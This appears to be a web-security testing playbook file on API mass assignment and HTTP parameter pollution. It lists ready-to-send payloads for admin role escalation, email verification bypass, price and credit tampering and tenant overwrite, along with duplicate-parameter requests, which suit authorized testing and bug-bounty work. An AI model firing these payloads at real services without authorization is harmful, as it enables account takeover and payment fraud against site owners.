---
name: web-api-mass-assignment-pollution
description: API Mass Assignment, object parameter tampering, hidden parameter binding (is_admin, role, price, verified), and HTTP Parameter Pollution (HPP).
playbook: web-security
---

# Web API Mass Assignment & Parameter Pollution

## Attack Vector Summary
Mass Assignment (also known as Over-Posting or Auto-Binding) occurs when modern web frameworks (Ruby on Rails, Spring Boot, ASP.NET Core, Express, Django REST Framework, Laravel) automatically bind HTTP request parameters (JSON, form fields, query strings) directly into internal database models or domain objects without strict property allow-lists.

## Tactical Heuristics & Step-by-Step Flow

### 1. High-Impact Target Properties & Payloads
Test injecting privileged or business-critical attributes during `POST` / `PUT` / `PATCH` object creation or profile updates:

```json
{
  "username": "tester",
  "email": "tester@example.com",
  
  // 1. Privilege Escalation Flags:
  "is_admin": true,
  "isAdmin": true,
  "admin": true,
  "role": "admin",
  "roles": ["admin", "superadmin"],
  "permissions": ["all", "*", "root"],
  "user_type": "superuser",
  
  // 2. Account Status & Verification:
  "email_verified": true,
  "is_verified": true,
  "status": "active",
  "mfa_enabled": false,
  
  // 3. Financial & Billing Parameters:
  "price": 0.0,
  "amount": 0,
  "discount": 100,
  "plan": "enterprise",
  "credits": 999999,
  "trial_ends_at": "2099-01-01T00:00:00Z",
  
  // 4. Multi-Tenant / Ownership Overwrite:
  "organization_id": 1,
  "tenant_id": 1,
  "account_id": 1
}
```

### 2. HTTP Parameter Pollution (HPP)
Test duplicate parameter parsing differences between frontend reverse proxies and backend application servers:

```http
# URL Query HPP:
POST /api/transfer?amount=100&amount=0.01 HTTP/1.1
POST /api/users/profile?role=user&role=admin HTTP/1.1

# Body Form HPP:
user=normal&user=admin
```

### 3. Content-Type Swapping & Nested Property Injection
- Swap `Content-Type: application/x-www-form-urlencoded` to `application/json` or `application/xml`.
- Test nested property injection: `{"user": {"role": "admin"}}` or `{"profile.role": "admin"}`.

## Empirical Disclosed Report Patterns & High-Risk Matrices
| Vector / Pattern | Mechanism | Empirical Pattern | Expected Evidence Marker |
|---|---|---|---|
| Role Elevation via JSON Body | Profile update endpoint accepts unmapped `role` field | `PATCH /api/user` with `{"role":"admin"}` | Response returns `role: "admin"` with escalated permissions |
| Subscription Tier Hijack | Registration accepts `plan: "enterprise"` | `POST /register` with plan attribute | Immediate enterprise tier access without billing |
| Email Verification Bypass | Update profile allows setting `is_verified: true` | `PUT /api/user` with verified flag | Account marked verified without clicking email confirmation |
| Financial Price Overwrite | Checkout order creates items with client-supplied `unit_price` | `POST /checkout` with `{"price": 0.01}` | Order successfully placed with manipulated total |

## Evidence Collection & Validation Gate
- Must capture request with injected parameter and response confirming property persistence.
- Demonstrate actual elevated capabilities or state change on the target.
- Evaluate against `/validate` 7-Question Validation Gate before reporting.
